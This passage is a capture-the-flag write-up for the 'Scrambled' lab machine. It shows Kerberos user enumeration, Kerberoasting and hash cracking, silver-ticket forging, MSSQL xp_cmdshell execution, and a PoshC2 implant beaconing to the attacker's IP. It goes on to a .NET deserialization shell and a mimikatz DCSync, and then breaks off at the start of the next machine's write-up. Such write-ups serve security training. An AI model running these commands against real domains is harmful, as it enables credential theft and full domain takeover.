:\nSF-Port4411-TCP:V=7.91%I=7%D=7/15%Time=62D1288A%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(GenericLines,1D,\"SCRAMBLEC\nSF:ORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(GetRequest,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.\nSF:3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(HTTPOptions,35,\"SCRAMBLECORP_ORDER\nSF:S_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(RTSPRequest,35,\"SCRAMBLEC\nSF:ORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(RPCCheck,1D,\"SCR\nSF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(DNSVersionBindReqTCP,1D,\"SCRAMBLECOR\nSF:P_ORDERS_V1\\.0\\.3;\\r\\n\")%r(DNSStatusRequestTCP,1D,\"SCRAMBLECORP_ORDERS_\nSF:V1\\.0\\.3;\\r\\n\")%r(Help,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNO\nSF:WN_COMMAND;\\r\\n\")%r(SSLSessionReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\nSF:\")%r(TerminalServerCookie,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(TLS\nSF:SessionReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(Kerberos,1D,\"SCRAM\nSF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(SMBProgNeg,1D,\"SCRAMBLECORP_ORDERS_V1\\\nSF:.0\\.3;\\r\\n\")%r(X11Probe,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(FourO\nSF:hFourRequest,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND\nSF:;\\r\\n\")%r(LPDString,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_\nSF:COMMAND;\\r\\n\")%r(LDAPSearchReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%\nSF:r(LDAPBindReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(SIPOptions,35,\"\nSF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(LANDesk\nSF:-RC,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(TerminalServer,1D,\"SCRAMB\nSF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(NCP,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\nSF:\\n\")%r(NotesRPC,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(JavaRMI,1D,\"S\nSF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(WMSRequest,1D,\"SCRAMBLECORP_ORDERS\nSF:_V1\\.0\\.3;\\r\\n\")%r(oracle-tns,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r\nSF:(ms-sql-s,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(afp,1D,\"SCRAMBLECOR\nSF:P_ORDERS_V1\\.0\\.3;\\r\\n\")%r(giop,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\");\n</code></pre> <p>Also, we can run <code>nc</code>. </p> <pre><code>nc 10.10.11.168 4411 \nSCRAMBLECORP_ORDERS_V1.0.3;\ntest\nERROR_UNKNOWN_COMMAND;\n</code></pre> <p>Going back to web pages, the web page <code>/passwords.html</code> disclose useful information. Which is: <code>we will reset your password to be the same as the username.</code> </p> <p></p> <p>So now we know that if we attempt to reset a user password, the new password will be same as the username. From this information, let's try to hunt for users. </p>"},{"location":"Writeups/machines/scrambled/writeup/#user-enumeration","title":"User Enumeration","text":"<p>Because it is Domain Controller we can enumerate valid Domain Users using Pre-Authentication. </p> <p>Note</p> <p>The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named \"pre-authentication\" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast. For further reading refer to this resource.</p> <p>To enumerate the valid Domain Users I'll use Impacket's <code>GetNPUsers</code> and shorter wordlist that can be found here. We can also use the wordlist <code>/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt</code> but will take too much of time. To enumerate the valid Domain Users run the following command: </p> <pre><code>GetNPUsers.py scrm.local/ -no-pass -dc-ip 10.10.11.168 -usersfile A-ZSurnames.txt\n</code></pre> <p></p> <p>Alternatively, we can use <code>Kerbrute</code> which is faster because it is based in Golang. <code>Kerbrute</code> can be downloaded from here</p> <pre><code>./kerbrute userenum -d scrm.local A-ZSurnames.txt --dc dc1.scrm.local\n\n    __             __               __     / /_____  _____/ /_  _______  __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n/ ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 07/15/22 - Ronnie Flathers @ropnop\n\n2022/07/15 05:36:26 &gt;  Using KDC(s):\n2022/07/15 05:36:26 &gt;   dc1.scrm.local:88\n\n2022/07/15 05:36:27 &gt;  [+] VALID USERNAME:   ASMITH@scrm.local\n2022/07/15 05:38:25 &gt;  [+] VALID USERNAME:   JHALL@scrm.local\n2022/07/15 05:38:39 &gt;  [+] VALID USERNAME:   KSIMPSON@scrm.local\n2022/07/15 05:38:47 &gt;  [+] VALID USERNAME:   KHICKS@scrm.local\n2022/07/15 05:40:25 &gt;  [+] VALID USERNAME:   SJENKINS@scrm.local\n</code></pre>"},{"location":"Writeups/machines/scrambled/writeup/#password-spray","title":"Password Spray","text":"<p>After finding valid Domain Users, let's conduct password spray attacks using the username as password for each user. Here we can use smartbrute tool. </p> <p></p> <p>Bug</p> <p>I had an issue during while solving the machine. NTLM authentication is disabled we can use kerberos authentication instead. The issue is when using tools such as <code>crackmapexec</code>  or <code>impacket</code> sometime it will fail and does not give us any information.  To solve this issue use <code>-k</code> flag to make use of kerberos authentication.</p>"},{"location":"Writeups/machines/scrambled/writeup/#enumerate-spns","title":"Enumerate SPNs","text":"<p>After obtaining valid creds, we might be able to enumerate SPNs account using Impacket's <code>GetUserSPNs</code>. As I said before the NTLM authentication will not work we should use the flag <code>-k</code>. Hence, I found an issue in <code>GetUserSPNs</code> to solve this issue refer to this link. </p> <pre><code>GetUserSPNs.py scrm.local/ksimpson:'ksimpson' -dc-ip dc1.scrm.local -request -k\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] CCache file is not found. Skipping...\n[-] CCache file is not found. Skipping...\nServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------  ------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2022-07-15 04:08:04.045229             \nMSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2022-07-15 04:08:04.045229             [-] CCache file is not found. Skipping...\n$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$031a9fba52ac8c46413a559f05f2fe1f$befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f\n</code></pre> <p>Now we retrieve the TGS of the SPN account <code>sqlsvc</code>, we can use <code>hashcat</code> to crack the TGS ticket. </p> <pre><code>hashcat -a 0 -m 13100 sqlsvc-spn /usr/share/wordlists/rockyou.txt --force\n\n$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$031a9fba52ac8c46413a559f05f2fe1f$befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f:Pegasus60\n</code></pre> <p>We cracked <code>sqlsvc</code>'s password which is: <code>Pegasus60</code>. As seen previously the service account <code>sqlsvc</code> is allowed to access <code>MSSQL</code> service.</p>"},{"location":"Writeups/machines/scrambled/writeup/#enumerate-shares","title":"Enumerate Shares","text":"<p>Because of NTLM authentication is disabled we will use kerberos as authetication protocol. To do this, we can export user's ticket using Impacket's <code>GetTGT</code>: </p> <pre><code>getTGT.py scrm.local/ksimpson:'ksimpson'       \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Saving ticket in ksimpson.ccache\n</code></pre> <p>The Domain User <code>ksimpson</code>'s ticket is exported in the file <code>ksimpsone.ccache</code>. Then, we have to save the exported ticket in the variable <code>KRB5CCNAME</code> in order to use the flag <code>-k</code>. </p> <pre><code>export KRB5CCNAME='ksimpson.ccache'\n</code></pre> <p>Now we can access shared folders for the Domain User <code>ksimpson</code>: </p> <pre><code>impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass\n\n# shares\nADMIN$\nC$\nHR\nIPC$\nIT\nNETLOGON\nPublic\nSales\nSYSVOL\n# use public\n# ls\ndrw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .\ndrw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..\n-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf\n# get Network Security Changes.pdf\n# exit\n</code></pre> <p>From <code>Public</code> shared folder we identify a document that contains: </p> <p></p> <p>After reading the letter we verified that the NTLM authentication is disabled in the machine. </p>"},{"location":"Writeups/machines/scrambled/writeup/#access-mssql","title":"Access MSSQL","text":"<p>What we can do now is access MSSQL service using <code>sqlsvc</code> service account via kerberos authentication. To do that, first we have to request for Ticket-Granting Service (TGS) ticket that will allows us to access the MSSQL service, or let's say we conduct silver ticket attack. Before we do that, we have to know SID of the domain. We can run <code>SecretDump</code> with the flag <code>-debug</code>: </p> <pre><code>secretsdump scrm.local/ksimpson@dc1.scrm.local -k -no-pass -debug\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket\n[+] Using Kerberos Cache: ksimpson.ccache\n... [+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500\n...\n</code></pre> <p>From the <code>SecretDump</code> output, the SID for the Domain SCRM.LOCAL is: <code>S-1-5-21-2743207045-1827831105-2542523200</code>. I removed 500 because it is represents the Domain Administrator. </p> <p>Furthermore, to conduct the attack the NTLM hash of the service account <code>sqlsvc</code> is required. We can convert the password of the service account <code>sqlsvc</code> to NTLM hash using Python. </p> <pre><code>import hashlib, binascii\nhash = hashlib.new('md4', \"Pegasus60\".encode('utf-16le')).digest()\nprint(binascii.hexlify(hash))\n</code></pre> <p></p> <p><code>sqlsvc</code> NTLM hash is: <code>b999a16500b87d17ec7f2e2a68778f05</code> </p> <p>Now we will use Impacket's <code>ticket</code> to generate TGS that will allow us to access MSSQL service: </p> <pre><code>ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local administrator\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in administrator.ccache\n</code></pre> <p>The TGS ticket saved in the file <code>administrator.ccache</code> we have to save it in the variable <code>KRB5CCACHENAME</code>:</p> <pre><code>export KRB5CCNAME='administrator.ccache'\n</code></pre> <p>Now we can access MSSQL: </p> <pre><code>impacket-mssqlclient dc1.scrm.local -dc-ip 10.10.11.168 -k -no-pass       \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC1): Line 1: Changed database context to 'master'.\n[*] INFO(DC1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands\nSQL&gt; </code></pre> <p>After obtaining access into MSSQL, the first thing we can do is enable <code>xp_cmdshell</code> to allow us to execute commands: </p> <pre><code>SQL&gt; enable_xp_cmdshell\n[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.\nSQL&gt; \ndisable_xp_cmdshell  enable_xp_cmdshell   exit                 help                 lcd                  shell                xp_cmdshell          \nSQL&gt; xp_cmdshell whoami\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nscrm\\sqlsvc                                                                        \n\nNULL                                                                               \n\nSQL&gt; </code></pre>"},{"location":"Writeups/machines/scrambled/writeup/#configuring-poshc2","title":"Configuring PoshC2","text":"<p>First of all, create a new project and name it as you want. I'll name it as <code>htb</code>. </p> <pre><code>posh-project htb\n</code></pre> <p>Then, configure the newly created profile. </p> <pre><code>posh-config\n</code></pre> <p>Go to the 14th line and point the value of <code>PayloadCommsHost</code> to your VPN IP. </p> <pre><code>PayloadCommsHost: \"https://&lt;your_vpn_ip&gt;\"\n</code></pre> <p></p> <p>Start the PoshC2 server by typing</p> <pre><code>sudo posh-server\n</code></pre> <p>In another windows connect the team server</p> <pre><code>posh -u user1 </code></pre> <p></p> <p>Now we have two windows. At the left is the team server and at the right is the user terminal. To make use of the C2 we should drop our beacon or payload into the box usually we have command execution in the box. There is a lots of payloads types that PoshC2 generates such as <code>Powershell reverse shell</code>, <code>Dlls</code>,<code>EXEs</code>, <code>Macros</code>, <code>DotNet2JS</code> or even <code>HTAs</code> which can be used in phishing campaigns. </p>"},{"location":"Writeups/machines/scrambled/writeup/#obtaining-access","title":"Obtaining Access","text":"<p>As I said PoshC2 have generated several payloads types, as demonstration we can use powershell oneliner. Run this command in MSSQL. </p> <p></p> <pre><code>SQL&gt; xp_cmdshell powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgB....FMA\n</code></pre> <p>After running this command in MSSQL we will receive a new implant in our C2.  </p> <p>Team server window:</p> <p></p> <p>Operation window: </p> <p></p> <p>If we execute the command <code>help</code> we can do many useful  operations such as: Active Directory enumeration, lateral movement, privilege escalation and many. </p> <p>As an example, let's enumerate domain objects ACLs: </p> <pre><code>SCRM\\sqlsvc @ DC1 (PID:5948)\nPS 1&gt; invoke-aclscanner </code></pre> <pre><code># teamserver: \nTask 00003 (user1) returned against implant 1 on host SCRM\\sqlsvc @ DC1 (2022-07-15 07:56:23)\n\n\n\nObjectDN                : DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=scrm,DC=local\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner\nObjectAceType           : None\nAceFlags                : ContainerInherit, Inherited\nAceType                 : AccessAllowed\nInheritanceFlags        : ContainerInherit\nSecurityIdentifier      : S-1-5-21-2743207045-1827831105-2542523200-1101\nIdentityReferenceName   : DnsAdmins\nIdentityReferenceDomain : scrm.local\nIdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=scrm,DC=local\nIdentityReferenceClass  : group\n\nObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=scrm,DC=local\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner\nObjectAceType           : None\nAceFlags                : ContainerInherit, Inherited\nAceType                 : AccessAllowed\nInheritanceFlags        : ContainerInherit\nSecurityIdentifier      : S-1-5-21-2743207045-1827831105-2542523200-1101\nIdentityReferenceName   : DnsAdmins\nIdentityReferenceDomain : scrm.local\nIdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=scrm,DC=local\nIdentityReferenceClass  : group\n</code></pre>"},{"location":"Writeups/machines/scrambled/writeup/#pivot-to-miscsql","title":"Pivot to MiscSQL","text":"<p>Going back to MSSQL, enumerate the databases: </p> <pre><code>SQL&gt; SELECT name FROM master.dbo.sysdatabases;\nname\n\n--------------------------------------------------------------------------------------------------------------------------------   \n\nmaster                                                                                                                             tempdb                                                                                                                             model                                                                                                                              msdb                                                                                                                               ScrambleHR\n</code></pre> <p>Enumerating the database <code>ScrambleHR</code> tables disclose for us the table <code>UserImport</code> </p> <pre><code>SELECT * FROM SYSOBJECTS\n</code></pre> <p>The table <code>UserImport</code> contains a Domain User creds:</p> <pre><code>SQL&gt; select * from UserImport\nLdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   --------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   \n\nMiscSvc                                              ScrambledEggs9900                                    scrm.local                                                        90               0   SQL&gt; </code></pre> <p>The creds are <code>MiscSvc:ScrambledEggs9900</code> we can test the validity of the obtained creds using PoshC2</p> <pre><code>PS 1&gt; test-adcredential -domain scrm.local -user miscsvc -password ScrambledEggs9900\n</code></pre> <p>Team Server: </p> <pre><code>Task 00023 (user1) returned against implant 1 on host SCRM\\sqlsvc @ DC1 (2022-07-15 08:23:53)\n\n\nUsername Password          IsValid\n-------- --------          -------\nmiscsvc  ScrambledEggs9900 True\n</code></pre> <p>To pivot to the Domain User <code>MiscSVC</code> run the following command in operations window: </p> <pre><code>$password = ConvertTo-SecureString \"ScrambledEggs9900\" -AsPlainText -Force\n$creds = new-object system.management.automation.pscredential(\"scrm.local\\miscsvc\", $password) \ninvoke-command -computer . -scriptblock { &lt;PoshC2 powershell oneliner payload&gt; } -credential $creds </code></pre> <p>After running the commands we will receive new implant as the domain user <code>miscsvc</code> </p> <p></p> <p></p> <p>Now we obtain access as <code>miscsvc</code></p>"},{"location":"Writeups/machines/scrambled/writeup/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/scrambled/writeup/#enumerating-sales-app","title":"Enumerating Sales App","text":"<p>By enumerating the host, we will identifies executable application \"Sales Order App\" which is locate at: <code>c:\\shares\\it\\apps\\Sales Order Client</code>.</p> <p></p> <p>We can download both files using PoshC2 by issuing the following command: </p> <pre><code>download-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleClient.exe\"\ndownload-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleLib.dll\"\n</code></pre> <p>The download location is at: <code>/var/poshc2/htb/downloads</code>. </p> <p>Here I used dnSpy to decompile the .NET applications. I focused in the .dll. After enumerating the source code of <code>ScrambleLib.dll</code>, found a function called <code>UploadOrder</code> that takes the input and deserialize it. From the first code, we can identify that we can pass the string <code>UPLOAD_ORDER</code> followed by simi-column followed by serialize object in base64 format. After passing this input the server will deserialize it and execute it. </p> <pre><code>public static string GetCodeFromMessageType(ScrambleNetRequest.RequestType MsgType)\n{\nif (ScrambleNetRequest._MessageTypeToCode == null)\n{\nScrambleNetRequest._MessageTypeToCode = new Dictionary&lt;ScrambleNetRequest.RequestType, string&gt;();\nScrambleNetRequest._MessageTypeToCode.Add(ScrambleNetRequest.RequestType.CloseConnection, \"QUIT\");\nScrambleNetRequest._MessageTypeToCode.Add(ScrambleNetRequest.RequestType.ListOrders, \"LIST_ORDERS\");\nScrambleNetRequest._MessageTypeToCode.Add(ScrambleNetRequest.RequestType.AuthenticationRequest, \"LOGON\");\nScrambleNetRequest._MessageTypeToCode.Add(ScrambleNetRequest.RequestType.UploadOrder, \"UPLOAD_ORDER\");\n}\nreturn ScrambleNetRequest._MessageTypeToCode[MsgType];\n</code></pre> <pre><code>public void UploadOrder(SalesOrder NewOrder)\n{\ntry\n{\nLog.Write(\"Uploading new order with reference \" + NewOrder.ReferenceNumber);\nstring text = NewOrder.SerializeToBase64();\nLog.Write(\"Order serialized to base64: \" + text);\nScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text));\nScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;\nif (type != ScrambleNetResponse.ResponseType.Success)\n{\nthrow new ApplicationException(scrambleNetResponse.GetErrorDescription());\n}\nLog.Write(\"Upload successful\");\n}\ncatch (Exception ex)\n{\nLog.Write(\"Error: \" + ex.Message);\nthrow ex;\n}\n}\n</code></pre> <p>As verification we can pass the string <code>UPLOAD_ORDER</code> followed by anything:</p> <pre><code>htb/downloads \u2192 nc 10.10.11.168 4411 \nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER\nERROR_GENERAL;Error deserializing sales order: Attempting to deserialize an empty stream.\nUPLOAD_ORDER;1\nERROR_GENERAL;Error deserializing sales order: Invalid length for a Base-64 char array or string.\n</code></pre> <p>As we can see the server takes the string after the simi-column and attempt to deserialize it. We can abuse this to obtain command executing by passing serialized reverse shell command. </p> <p></p> <p>Now connect to Sales app server using <code>netcat</code> and enter the deserialized string as below:</p> <pre><code>nc 10.10.11.168 4411 \nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;AAEAAAD/////... </code></pre> <p>After short time we will receive a new implant as SYSTEM . </p> <p></p> <p></p> <p>Finally, we can conduct DCSync towards the Domain Controller from PoshC2 using the following command: </p> <pre><code>invoke-mimikatz -command '\"privilege::debug\" \"lsadump::dcsync /domain:scrm.local /all\"' </code></pre> <p></p>"},{"location":"Writeups/machines/scrambled/writeup/#lesson-learned","title":"Lesson Learned","text":"<ul> <li> <p> Using PoshC2 as Command &amp; Control for PT Operations.</p> </li> <li> <p> User enumeration via pre-authetication. </p> </li> <li> <p> Dealing with kerberos authentication to lateral movements and pivoting.</p> </li> <li> <p> .NET source code review. </p> </li> <li> <p> Deserialization attack.   </p> </li> </ul>"},{"location":"Writeups/machines/shoker/writeup/","title":"Overview","text":""},{"location":"Writeups/machines/shoker/writeup/#machine-info","title":"Machine Info","text":""},{"location":"Writeups/machines/shoker/writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/shoker/writeup/#recon","title":"Recon","text":""},{"location":"Writeups/machines/shoker/writeup/#nmap","title":"nmap","text":"<pre><code>PORT     STATE SERVICE REASON  VERSION\n80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: |_  Supported Methods: POST OPTIONS GET HEAD\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n| ecdsa-sha2-nistp256 